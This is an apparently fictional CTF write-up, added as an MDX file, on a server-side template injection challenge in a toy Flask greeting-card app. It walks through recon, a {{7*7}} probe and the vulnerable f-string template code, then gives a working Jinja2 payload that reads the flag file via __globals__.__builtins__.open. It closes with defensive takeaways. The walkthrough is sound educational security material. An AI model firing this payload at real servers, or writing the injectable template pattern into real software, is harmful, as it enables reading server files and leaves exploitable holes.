@@ -1,0 +1,120 @@
+---
+title: "Template Trouble: A Server-Side Template Injection Walkthrough"
+description: "A fictional medium-difficulty web challenge from Example CTF 2026, exploring a server-side template injection bug in a toy Flask app."
+ctf: "Example CTF 2026"
+date: 2026-10-12
+updated: 2026-10-20
+category: web
+difficulty: medium
+points: 350
+tags: [ssti, jinja2, python, flask]
+team: "Null Pointers"
+---
+
+import { Callout, Flag, Terminal, Spoiler } from '../../components/mdx';
+
+{/* Everything below is fictional and for education only: the CTF, the team, the host and the flag are all made up. */}
+
+## Challenge description
+
+"Template Trouble" was a web challenge in the fictional Example CTF 2026. The prompt read roughly like this:
+
+> Our greeting card service lets you personalise a message for any occasion. We are confident nobody can break our templates. The flag lives on the server.
+
+The target ran a small Flask app on a lab host reserved for the competition (`challenge.example.test`, which does not resolve anywhere real). Players got a single endpoint that rendered a name into a greeting.
+
+<Callout type="info" title="Scope reminder">
+This writeup covers a practice challenge on infrastructure built for the CTF. It is not about any production system, and none of the details below apply outside that sandbox.
+</Callout>
+
+## Recon
+
+### Fingerprinting the stack
+
+A couple of simple requests are usually enough to narrow down the framework and templating engine in play.
+
+<Terminal
+  title="Initial recon"
+  commands={[
+    { cmd: "curl -sI http://challenge.example.test/", output: "HTTP/1.1 200 OK\nServer: Werkzeug/3.0.1 Python/3.12.1\nContent-Type: text/html; charset=utf-8" },
+    { cmd: "curl -s 'http://challenge.example.test/card?name=chiloute'", output: "<h1>Happy birthday, chiloute!</h1>" },
+  ]}
+/>
+
+The `Werkzeug` server header hints at Flask, and Flask's default templating engine is Jinja2. That's a useful lead: Jinja2 is a well-documented templating language, see the [official Jinja documentation](https://jinja.palletsprojects.com/).
+
+### Probing the `name` parameter
+
+The next step was to check whether the `name` query parameter was being rendered literally or interpreted as part of the template itself. A classic probe is to supply a small arithmetic expression in the templating language's syntax and see if it gets evaluated.
+
+<Terminal
+  title="Probing for injection"
+  commands={[
+    { cmd: "curl -s 'http://challenge.example.test/card?name=%7B%7B7*7%7D%7D'", output: "<h1>Happy birthday, 49!</h1>" },
+  ]}
+/>
+
+Seeing `49` instead of the literal text `{{7*7}}` confirmed that user input was being passed straight into the template renderer rather than treated as plain data.
+
+<Callout type="tip" title="Why this matters">
+Any time user-controlled text ends up inside a template string before rendering, rather than being passed in as a variable, you should suspect server-side template injection (SSTI). The [OWASP page on server-side template injection](https://owasp.org/www-community/Server_Side_Template_Injection) is a good primer on the general idea and detection techniques.
+</Callout>
+
+## Vulnerability
+
+Looking at a reconstructed, simplified version of the backend code (shared by the organisers after the CTF for the writeup), the bug was a classic string-formatting mistake:
+
+```python
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+@app.route("/card")
+def card():
+    name = request.args.get("name", "friend")
+    template = f"<h1>Happy birthday, {name}!</h1>"
+    return render_template_string(template)
+```
+
+Instead of passing `name` as a *variable* to the template (e.g. `render_template_string("<h1>Happy birthday, {{ name }}!</h1>", name=name)`), the developer concatenated it directly into the template *source* with an f-string. That means whatever the visitor sends ends up as Jinja2 syntax, not as data, which is exactly the mistake SSTI thrives on.
+
+<Callout type="warning" title="Common root cause">
+This is one of the most frequent causes of SSTI: building the template string dynamically with user input, instead of keeping the template static and passing user input through the context dictionary.
+</Callout>
+
+## Exploitation
+
+With confirmed template evaluation, the next goal was to reach something useful: a file read. Jinja2 exposes Python object internals through its sandboxed-but-leaky attribute access, which is a well known technique for walking from a template object back to builtins.
+
+A payload that works against unpatched `render_template_string` setups like this one looks like:
+
+```http
+GET /card?name=%7B%7B%20self.__init__.__globals__.__builtins__.open('/app/flag.txt').read()%20%7D%7D HTTP/1.1
+Host: challenge.example.test
+```
+
+Sent through `curl`, the request and (trimmed) response look like this:
+
+<Terminal
+  title="Reading the flag file"
+  commands={[
+    { cmd: "curl -s 'http://challenge.example.test/card?name=%7B%7B%20self.__init__.__globals__.__builtins__.open(%27/app/flag.txt%27).read()%20%7D%7D'", output: "<h1>Happy birthday, EXAMPLE{t3mpl4t3s_ar3nt_d4t4_57r1ngs}!</h1>" },
+  ]}
+/>
+
+<Spoiler title="Hint, if you want to try it yourself first">
+Look for any Jinja2 object exposed in the current context (even `self`, which Jinja2 always exposes) and walk through `__init__.__globals__` to reach the module's global namespace, which usually has `__builtins__` attached.
+</Spoiler>
+
+## Flag
+
+<Flag value="EXAMPLE{t3mpl4t3s_ar3nt_d4t4_57r1ngs}" />
+
+## Takeaways
+
+- Never build a template string by concatenating or formatting in user input; always pass user data through the template's variable context instead.
+- Treat any templating engine's "safe" sandbox as a speed bump, not a guarantee — attribute-chain tricks have repeatedly bypassed Jinja2 sandboxes over the years.
+- When fingerprinting a web target, server headers and framework defaults (Flask + Jinja2, in this case) are often enough to guess which injection family to try first.
+- During recon, always confirm *evaluation* (e.g. `7*7` → `49`) before investing time in building a full read/write payload — it saves time if the parameter turns out to just be escaped correctly.
+
+Further reading: the [Jinja2 documentation on template design](https://jinja.palletsprojects.com/en/stable/templates/) is worth reading end to end if this category interests you, alongside the [OWASP SSTI reference](https://owasp.org/www-community/Server_Side_Template_Injection) linked above.
